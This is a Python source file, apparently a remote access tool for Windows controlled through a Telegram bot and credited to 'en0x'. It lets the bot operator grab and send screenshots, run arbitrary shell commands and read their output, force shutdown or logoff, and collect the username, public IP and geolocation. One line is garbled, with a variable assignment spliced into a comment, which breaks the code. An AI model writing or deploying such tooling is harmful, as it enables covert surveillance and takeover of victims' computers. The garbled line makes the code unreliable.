import telebot
import os
from PIL import ImageGrab
import platform
import requests
import re
import subprocess

print('''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~

        code by en0x

github --> https://github.com/FotoKoyo''')

bot = telebot.TeleBot("TOKEN")

#create/check path fo
CHAT_ID = "CHATID"r all file
try:
    os.mkdir("C://Windows//Temp//")
except:
    path = "C://Windows//Temp//"

#main button
button = telebot.types.ReplyKeyboardMarkup()
button1 = telebot.types.KeyboardButton('screen')
button2 = telebot.types.KeyboardButton('power')
button4 = telebot.types.KeyboardButton('cmd')
button5 = telebot.types.KeyboardButton('info')
button.row(button1, button2, button4)
button.row(button5)

#power button
power_button = telebot.types.InlineKeyboardMarkup()
button1 = telebot.types.InlineKeyboardButton('shutdown', callback_data='shutdown')
button2 = telebot.types.InlineKeyboardButton('hiber', callback_data='hiber')
button3 = telebot.types.InlineKeyboardButton('restart', callback_data='restart')
button4 = telebot.types.InlineKeyboardButton('logoff', callback_data='logoff')
button7 = telebot.types.InlineKeyboardButton('sleep', callback_data='moon')
power_button.row(button1)
power_button.row(button2)
power_button.row(button3)
power_button.row(button4)
power_button.row(button7)

@bot.callback_query_handler(func=lambda call: True)
def CallbackInline(command):
    if command.message:
        if command.data == 'shutdown':
            os.system("shutdown -s /t 0 /f")

        elif command.data == 'hiber':
            os.system("shutdown -s /t 0 /f")

        elif command.data == 'restart':
            os.system("shutdown -r /t 0 /f")

        elif command.data == 'logoff':
            os.system("shutdown -l /f")

        elif command.data == 'moon':
            os.system("shutdown /h")

#command
@bot.message_handler(regexp="/start")
def start(message):
	bot.delete_message(message.chat.id, message.id)
	bot.send_message(message.chat.id, '''screen - desktop screen(no real time)
power - power control
cmd - remote send command for cmd
info - get system information''', reply_markup=button)

@bot.message_handler(regexp="screen")
def screen(message):
    screen_path = 'C://Windows//Temp//screenshot.jpg'
    bot.delete_message(message.chat.id, message.id)
    screenshot = ImageGrab.grab()
    screenshot.save(screen_path)
    bot.send_photo(message.chat.id, screenshot)
    os.remove(screen_path)

@bot.message_handler(regexp="power")
def power(message):
	bot.delete_message(message.chat.id, message.id)
	bot.send_message(message.chat.id, "change settings", reply_markup=power_button)

@bot.message_handler(regexp="cmd")
def remote_command(message):
    bot.delete_message(message.chat.id, message.id)
    try:
        Command = re.split('cmd ', message.text, flags=re.I)[1]
        CMD = subprocess.Popen(Command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        Lines = []
        for Line in CMD.stdout.readlines():
            Line = Line.strip()
            if Line:
                Lines.append(Line.decode('cp866'))
                Output = '\n'.join(Lines)
        bot.send_message(message.chat.id, Output)
    except:
        bot.send_message(message.chat.id, "cmd <command>")

@bot.message_handler(regexp="info")
def infor(message):
    response = requests.get('https://ifconfig.me/ip')
    public_ip = response.text.strip()
    url = f'http://ip-api.com/json/{public_ip}'
    res = requests.get(url)
    data = res.json()

    bot.delete_message(message.chat.id, message.id)
    country = data.get('country')
    info = f'''
Platform: {platform.platform()}
Username: {os.getlogin()}
IP: {public_ip}
Country: {data.get('country')}
region: {data.get('region')}
city: {data.get('city')}
lat: {data.get('lat')}
lon: {data.get('lon')}
isp: {data.get('isp')}
'''
    bot.send_message(message.chat.id, info)

bot.polling()
